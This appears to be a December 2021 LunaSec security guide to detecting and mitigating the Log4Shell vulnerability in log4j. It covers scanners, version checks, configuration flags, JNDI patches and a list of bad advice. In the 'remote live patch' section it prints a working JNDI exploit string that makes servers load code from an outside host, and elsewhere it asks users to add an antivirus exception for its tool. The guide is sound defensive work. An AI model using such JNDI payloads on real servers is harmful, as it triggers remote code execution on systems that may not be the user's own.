## Be careful what Log4Shell advice you trust online

Because of the severe impact from this vulnerability, there has been a lot of discussion on the internet
about it. **Some of this information is outdated or wrong and _will_ leave you vulnerable if you follow it!**

In contrast, this guide has been written by a team of professional Security Engineers at LunaSec. Everything here has
been peer-reviewed by multiple security experts, and where possible our sources will be linked for other Security
professionals to verify against.  This post links to many other guides and how-tos that we believe are trustworthy.  

The full list of common bad advice is at the [bottom of this post](#known-bad-advice). If you believe you've already 
mitigated Log4Shell, or you believe you're not vulnerable, please double-check your current information is up-to-date. 

## Determine if you are impacted by Log4Shell

This vulnerability affects anybody who's using the log4j packages. That means it's
primarily Java, but other languages like Scala, Groovy, or Clojure are also impacted.

### Automatically Scanning Your Package

We've built a command line utility that can check `.jar` and `.war` files in your project directory and report if any are vulnerable. 
It works by scanning for hashes of [known vulnerable log4j classes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes).
If you have a vulnerable version of a log4j in your built Java project, the hash will match a one
of the hashes in the list.

**[Download from GitHub](https://github.com/lunasec-io/lunasec/releases/)**

_Make sure you download the right version for your Operating System and CPU architecture._ Once downloaded, you can extract
it and run the `log4shell` command in your terminal.  The tool can scan individual files or whole directories.



**OSX or Linux**
```shell title="Example *nix Command"
log4shell scan your-project-dir/
```

**Windows**
```shell title="Example Windows Command"
log4shell.exe scan your-project-dir/
```
Because the tool contains exploit strings needed for the `livepatch` command, it might be falsely recognized as malware by some
virus scanners on Windows. Please add an exception for it.

**Example Output**
```shell

```

**Installing the Package on *nix systems (optional)**
```shell
$ sudo cp log4shell /usr/local/bin
$ log4shell
```

:::note
Please make sure that you're running this command on your fully built `.jar` or `.war` file. If you are
using vendor software that you think might be vulnerable, but you can't get the `.jar` or `.war` files to scan yourself (or it is obfuscated), then you'll need to check out the [section on
vendor software](#checking-vendor-software-versions) advisories instead.
:::

The source code for this is available on our GitHub 
[here](https://github.com/lunasec-io/lunasec/tree/master/tools/log4shell/).

### Manually Scanning Your Dependencies

The above CLI tool automatically looks for hashes of vulnerable classes.  Read this if you'd like to build your own tool or scan manually.

#### Scanning for vulnerable .class files

Our automated tool above implements this functionality, but if you need to do this yourself then
[our Go source code](https://github.com/lunasec-io/lunasec/tree/master/tools/log4shell/constants/vulnerablehashes.go)
has a list of hashes that you can use to scan with. (Thank you, [hillu](https://github.com/hillu/local-log4j-vuln-scanner/)!)

#### Scanning for the log4j JAR file

You may want to simply scan the filesystem for vulnerable copies of the log4j `.jar` file.  We wrote a small shell script to accomplish
that before writing the above CLI.

This is a less accurate method of detection versus our automated scanner tool above because rather an inspecting inside your code,
it requires the log4j `.jar` file to be present on your filesystem (not inside your built package). It _does not_ recursively unpack `.jar` files. This 
works best if your dependencies are committed into your Repo, or if you're using a tool like Maven that downloads the 
`.jar` files for you.  

**If you're using Maven:** The default directory that `.jar` files are downloaded to is `~/.m2`. You may want to clear
your cache, and _then_ rebuild your project in order to limit false positives.

**Setup**
```shell
git clone https://github.com/lunasec-io/lunasec.git
cd lunasec/tools/log4shell-jar-scripts
./setup.sh
```

**Run Scan**
```shell
./find-bad-deps.sh /path/to/folder/to/scan
```

### Checking Package Version

If you can check what versions of log4j2 are being used, you can check for any below the recently published 
`2.16.0`.

:::caution Limited vulnerability in `2.15.0`
As of Tuesday, Dec 14, version `2.15.0` was found to still have a possible [vulnerability in some apps](https://logging.apache.org/log4j/2.x/security.html).
We recommend updating to `2.16.0` which removes the message lookup feature entirely.
:::

#### log4j v2

Almost all versions of log4j version 2 are affected.

`2.0-beta9 <= Apache log4j <= 2.14.1`

In other words, if you're using any version of log4j that is _older_ than `2.15.0`, you are most likely vulnerable, and under very specific situations,
still possibly vulnerable on `2.15.0`.

#### log4j v1

Version 1 of log4j is vulnerable to other RCE attacks (like 
[CVE-2019-17571](https://www.cvedetails.com/cve/CVE-2019-17571/)), and if you're using it you need to
[migrate](https://logging.apache.org/log4j/2.x/manual/migration.html) to `2.16.0`.

### Checking Vendor Software Versions
The above scanning tool might not work for vendor's packages because of obfuscation, and in any case, you'll likely need
to contact the vendor for mitigation.

Luckily, many vendors have created their own documents to explain the impact of Log4Shell on their products, and an extensive list
of those advisories is being compiled [here](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592).

If a vendor has not created an advisory for this, there currently does not exist a succinct list of which Vendor 
software has been affected. There is an effort by Kevin Beaumont to create a spreadsheet that attempts to capture this
being worked on, but at this time of this post that effort is still a
[work in progress](https://twitter.com/GossiTheDog/status/1470181063980896262).

### Scanning Remote Endpoints
Please see our instructions to identify vulnerable remote servers in our original [Log4Shell post](https://www.lunasec.io/docs/blog/log4j-zero-day/#how-to-identify-vulnerable-remote-servers).

## How to Mitigate the Issue

Now that you know where you're vulnerable, the following sections will help you to figure out how to patch it.

This diagram created by the [Swiss Government](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/) is an excellent
visualization of the Log4Shell exploit.  Take note of the possible solutions (shown in red) as we go over mitigation strategies.

  <img src="https://www.lunasec.io/docs/img/log4j-attack-and-mitigations.png" alt="log4shell 0day diagram" />
</a>


### Option 1: Upgrading to 2.16.0

Apache log4j has released a version that fixes the Log4Shell vulnerability as of version `2.16.0`. This version disables JNDI by 
default and removes the message lookup feature.

**[Apache log4j Download Page](https://logging.apache.org/log4j/2.x/download.html)**

We recommend you upgrade, if possible.  For most people, this is the final and correct solution to the issue.

:::caution Version 2.15.0 still may be vulnerable
Log4j version `2.15.0` which was previously thought to be secure has been found to still have a [limited vulnerability](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f), 
that could result in a DOS (but not RCE), users must update to `2.16.0`. 
:::

### Option 2: Enable `formatMsgNoLookups`
:::warning This flag does not prevent all vulnerabilities
As of Dec 14, it's been found that this flag is ineffective at stopping RCE in some situations,
explained here [by log4j](https://logging.apache.org/log4j/2.x/security.html) and in
[CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046). We found the CVE wording confusing and
are still investigating this vulnerability.

You must update to `2.16.0` or use the JNDI patches below.
:::
The above release of log4j hardcodes the `formatMsgNoLookups` flag to true, ~~preventing the attack~~.  If you are using log4j
version `2.10.0` to version `2.14.0` and can't yet update, you can still set the flag manually.

Set `formatMsgNoLookups=true` when you configure log4j by performing one of the following:

#### Pass as a JVM Flag

You can pass this as an argument when you invoke `java`.

`java -Dlog4j2.formatMsgNoLookups=true ...`

#### Set Environment Variable

Alternatively, this feature may be set via Environment Variable.

`LOG4J_FORMAT_MSG_NO_LOOKUPS=true java ...`

Or you can set this using the JVM arguments environment variable.

`JAVA_OPTS=-Dlog4j2.formatMsgNoLookups=true`

### Option 3: JNDI patch
It's possible to [modify the JNDI in place](https://news.ycombinator.com/item?id=29507263) to stop the attack at the language level.
It can even be done while the server is running with tools like
[Log4jHotPatch](https://github.com/corretto/hotpatch-for-apache-log4j2) (as a temporary mitigation before updating log4j).

[This guide](https://medium.com/@edeNFed/patching-log4shell-in-one-command-without-downtime-using-ephemeral-containers-c69a9155ab1e) 
also explains how to apply the patch to Kubernetes services using "Ephemeral Containers" at runtime.

:::info
If you need a long-term solution for patching vendor software, please check out our commercial
[Live Patch service](https://www.lunasec.io/pages/live-dependency-patching) to mitigate Log4Shell _and_ the next
0-day vulnerability automatically.
:::

### Option 4: Remote live patch for servers
Because of the extensive control Log4Shell gives an attacker, it's actually possible to use the bug against itself to patch a running server.
This isn't the recommended strategy for various reasons, but it could be a last resort for systems that you can't easily restart or modify.  Note that doing this on a system 
you don't have permission to is most likely illegal. The fix will only work until the server (or the JVM) is restarted.

We've published articles about this exploit that you can use to learn more about how it works.
- **[Overview (When to use it)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**,
- **[Technical Deep-dive](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical)**

#### Hosted Exploit Payload

```
${jndi:ldap://patch.log4shell.com:1389/a}
```

Using this will patch your server against future exploitation _until it restarts_. Just simply paste that anywhere into
your server where you're vulnerable to use it. For example, in the `main` function when you start up your server, or a known
vulnerable field if it's a vendor product you depend on.

We have added this functionality to the [latest release](https://github.com/lunasec-io/lunasec/releases) of our
Log4Shell CLI tool if you'd prefer to run the server yourself instead.

:::warning Not permanent solution!

Please do not rely on this forever (in case our site ever goes down). This should only be used as a stop-gap solution
until you can apply a more permanent patch for Log4Shell.

If you need a permanent solution for Log4Shell, please check out our commercial
[Live Patch service](https://www.lunasec.io/pages/live-dependency-patching) for a production-ready alternative.
:::

## How to protect yourself from future 0-days

It's becoming increasingly apparent that Log4Shell is not going to be the last vulnerability of its kind. Any trusted dependency
can have security flaws or be malicious, and there is always the risk of accidentally introducing vulnerabilities into your own system.

The only way to implement software that is truly resilient to future security vulnerabilities like Log4Shell is to implement a
"Secure by Default" architecture. This is what companies and
[the federal government](https://www.nextgov.com/cybersecurity/2021/09/biden-administration-releases-draft-zero-trust-guidance/185166/)
are migrating to now because it's the only strategy that protects you long-term.

### What is "Secure by Default"?

We've written about this before in our post on 
[Why Data Breaches Happen](https://www.lunasec.io/docs/blog/how-data-breaches-happen-and-why-secure-by-default-software-is-the-future/),
but the short version is: **Accept that you're going to be hacked**, and that the outer walls of your system will eventually be breached.

Build security into the parts of your system that specifically need it. Secure by Default
software is designed to fail predictably under attack, so that the most sensitive data remains secure.

We've made implementing that as easy as possible with our Open Source security framework [LunaSec](https://www.lunasec.io/docs/pages/overview/introduction/).
It works inside web apps, embedding an additional layer of isolation around the most sensitive data.  Please leave us a star [on GitHub](https://github.com/lunasec-io/lunasec-monorepo).


## Known Bad Advice

The following are all pieces of advice we've seen thrown around online that are misguided and dangerous. If you see
advice online that contains any of the following, we please ask you to share this post with the authors to help limit
the fallout from Log4Shell.

### Updating Java is insufficient

There are many reports online that only certain Java versions are affected and that you're safe if you're on a newer
Java version.  Even on newer versions, it's still possible for an attacker to
[instantiate local classes](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) on the server to
trigger an exploit. And, even if no exploits are found right away, it still enables a Denial-of-Service attack when
you're using a vulnerable version of log4j.

We believe it's likely only a matter of time before all current Java versions are impacted when
running a vulnerable version of log4j. Just upgrading your Java version is insufficient, and you should not rely on this
as a long-term defense against exploitation.

### A WAF will not save you from Log4Shell

The Log4Shell vulnerability can _not_ be entirely mitigated by using a WAF (Web Application Firewall) because it _does not_
require your usage of it to be *publicly accessible*. Internal Data Pipelines, like Hadoop and Spark, and Desktop apps
like the [NSA's Ghidra](https://twitter.com/NSA_CSDirector/status/1469305071116636167) will still be vulnerable.

In addition, there is no simple way to "filter out" malicious requests with a simple WAF rule because Log4Shell payloads
may be nested. (See [this GitHub](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words) for examples)

If you are using a vulnerable version of log4j, the only secure way to mitigate Log4Shell is through one of the
strategies detailed above.

### Updating the log statement format with `%m{nolookupzz}` is not advisable

_This only applies to log4j versions `>= 2.7.0`, older versions don't support it_

:::warning
In addition to the below issues with this strategy, this mitigation may be bypassed in certain scenarios and still allows for RCE (see
[our dedicated post](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046)
about it), and this has been entirely [removed](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternMethod)
in log4j 2.16.0 and newer.
:::

Some people online are suggesting updating your logging statements from `%m` to `%m{nolookupzz}` to mitigate this**.

_The string is intentionally wrong here to prevent blind copy-pasting._

We do not recommend you follow this strategy.  Even if you manage to patch your application 100%
today, you will still likely accidentally add a `%m` again in the future and _then you will be vulnerable again_.

In addition, it's possible to miss a line in your logging statements, or have a dependency that
is using log4j with `%m` without you realizing. If either happens _you will still be vulnerable_.

We're strong advocates of a "[Secure by Default](#what-is-secure-by-default)" mentality with software, and we
recommend you follow one of the other mitigations instead.
